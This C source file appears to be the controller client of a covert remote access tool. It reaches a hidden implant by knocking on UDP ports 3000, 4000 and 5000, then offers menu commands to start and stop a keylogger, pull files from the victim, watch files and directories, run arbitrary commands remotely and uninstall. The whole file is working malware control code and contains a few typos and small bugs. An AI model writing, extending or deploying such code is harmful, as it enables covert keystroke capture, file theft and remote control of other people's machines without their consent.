#include "menu.h"
#include "fsm.h"
#include "udp.h"
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void print_menu(void) {
  printf("\n===== Client Menu =====\n");
  printf("1. Connect\n");

  printf("Select an option: ");
}

static void print_menu_connected(void) {
  printf("\n===== Client Menu =====\n");
  printf("2. Disconnect\n");
  printf("3. Uninstall\n");
  printf("4. Start Keylogger\n");
  printf("5. Stop Keylogger\n");
  printf("6. Transfer File To Remote\n");
  printf("7. Transfer File From Remote\n");
  printf("8. Watch File\n");
  printf("9. Watch Directory\n");
  printf("10. Run Program\n");
  printf("Select an option: ");
}

menu_option menu_get_selection(int connected) {
  char buffer[64];
  long choice;
  char *end;

  while (1) {
    if (connected)
      print_menu_connected();
    else
      print_menu();

    if (!fgets(buffer, sizeof(buffer), stdin)) {
      printf("Input error.\n");
      continue;
    }

    choice = strtol(buffer, &end, 10);

    if (end == buffer || (*end != '\n' && *end != '\0')) {
      printf("Invalid input. Enter a number.\n");
      continue;
    }

    if (choice < 1 || choice > 10) {
      printf("Invalid option. Choose 1–10.\n");
      continue;
    }

    return (menu_option)(choice - 1);
  }
}

static int send_udp(const struct ip_info *ctx, const char *msg,
                    size_t msg_len) {
  int sock = socket(AF_INET, SOCK_DGRAM, 0);
  if (sock < 0) {
    perror("socket");
    return -1;
  }

  if (ctx->src_port > 0) {
    struct sockaddr_in src = {0};
    src.sin_family = AF_INET;
    src.sin_port = 0;
    src.sin_addr.s_addr = ctx->local_ip;
    if (bind(sock, (struct sockaddr *)&src, sizeof(src)) < 0) {
      perror("bind");
      close(sock);
      return -1;
    }
  }

  struct sockaddr_in dest = {0};
  dest.sin_family = AF_INET;
  dest.sin_port = htons(ctx->dest_port);
  dest.sin_addr.s_addr = ctx->dest_ip;

  if (sendto(sock, msg, msg_len, 0, (struct sockaddr *)&dest, sizeof(dest)) <
      0) {
    perror("sendto");
    close(sock);
    return -1;
  }

  close(sock);
  return 0;
}

int port_knock(struct ip_info *ip_ctx) {
  char input[1024];
  char *result = NULL;

  int ports[] = {3000, 4000, 5000};

  printf("Enter IP address: ");
  fflush(stdout);

  if (!fgets(input, sizeof(input), stdin))
    return -1;

  input[strcspn(input, "\n")] = '\0';

  if (input[0] == '\0') {
    printf("No IP specified.\n");
    return -1;
  }

  uint32_t dest_ip;
  if (inet_pton(AF_INET, input, &dest_ip) != 1) {
    printf("Invalid IP address.\n");
    return -1;
  }

  ip_ctx->dest_ip = dest_ip;

  struct ip_info ctx = *ip_ctx;

  for (int i = 0; i < 3; i++) {
    ctx.dest_port = ports[i];

    printf("senfing udp\n");
    if (send_udp(&ctx, "hi", 2) != 0)
      return 0;

    // usleep(150000);
  }

  printf("waiting for re\n");
  if (receive_string(*ip_ctx, &result) != 0)
    return -1;

  printf("RESULT: %s\n", result);

  if (!result)
    return 0;

  printf("Received: %s\n", result);

  int success = (strcmp(result, "yY") == 0);

  free(result);

  return success ? 1 : 0;
}

int disconnect(struct ip_info ip_ctx) {
  send_string(ip_ctx, "2.");

  printf("Disconnected");

  return 0;
}

int uninstall(struct ip_info ip_ctx) {
  send_string(ip_ctx, "3.");

  printf("Uninstalling...");

  return 0;
}

int start_keylogger(struct ip_info ip_ctx) {
  send_string(ip_ctx, "4.");

  printf("Started keylogger");

  return 0;
}

int stop_keylogger(struct ip_info ip_ctx) {
  send_string(ip_ctx, "5.");

  printf("Stopped keylogger");

  return 0;
}

int transfer_file(struct ip_info ip_ctx) {
  char path[1024];

  if (send_string(ip_ctx, "6.") != 0)
    return -1;

  printf("Enter file path to send: ");
  fflush(stdout);

  if (!fgets(path, sizeof(path), stdin))
    return -1;

  path[strcspn(path, "\n")] = '\0';

  if (path[0] == '\0') {
    printf("No file specified.\n");
    return -1;
  }

  if (send_file(ip_ctx, path) != 0) {
    printf("Failed to send file: %s\n", path);
    return -1;
  }

  printf("File %s sent successfully.\n", path);
  return 0;
}

int request_file(struct ip_info ip_ctx) {
  char path[1024];

  if (send_string(ip_ctx, "7.") != 0)
    return -1;

  printf("Enter file path to request: ");
  fflush(stdout);

  if (!fgets(path, sizeof(path), stdin))
    return -1;

  path[strcspn(path, "\n")] = '\0';

  if (path[0] == '\0') {
    printf("No file specified.\n");
    return -1;
  }

  if (send_string(ip_ctx, path) != 0)
    return -1;

  printf("File %s requested.\n", path);

  receive_file(ip_ctx);
  return 0;
}

int watch_file(struct ip_info ip_ctx) {
  char path[1024];

  if (send_string(ip_ctx, "8.") != 0)
    return -1;

  printf("Enter file path to watch: ");
  fflush(stdout);

  if (!fgets(path, sizeof(path), stdin))
    return -1;

  path[strcspn(path, "\n")] = '\0';

  if (path[0] == '\0') {
    printf("No file specified.\n");
    return -1;
  }

  if (send_string(ip_ctx, path) != 0)
    return -1;

  printf("File %s requested to watch.\n", path);
  return 0;
}

int watch_directory(struct ip_info ip_ctx) {
  char path[1024];

  if (send_string(ip_ctx, "9.") != 0)
    return -1;

  printf("Enter Directory path to watch: ");
  fflush(stdout);

  if (!fgets(path, sizeof(path), stdin))
    return -1;

  path[strcspn(path, "\n")] = '\0';

  if (path[0] == '\0') {
    printf("No file specified.\n");
    return -1;
  }

  if (send_string(ip_ctx, path) != 0)
    return -1;

  printf("Directory %s requested to watch.\n", path);
  return 0;
}

int run_program(struct ip_info ip_ctx) {
  char cmd[1024];
  char *result = NULL;

  if (send_string(ip_ctx, "10") != 0)
    return -1;

  printf("Enter command to run: ");
  fflush(stdout);

  if (!fgets(cmd, sizeof(cmd), stdin))
    return -1;

  cmd[strcspn(cmd, "\n")] = '\0';

  if (cmd[0] == '\0') {
    printf("No command specified.\n");
    return -1;
  }

  if (send_string(ip_ctx, cmd) != 0)
    return -1;

  if (receive_string(ip_ctx, &result) != 0)
    return -1;

  fputs(result, stdout);

  free(result);
  return 0;
}
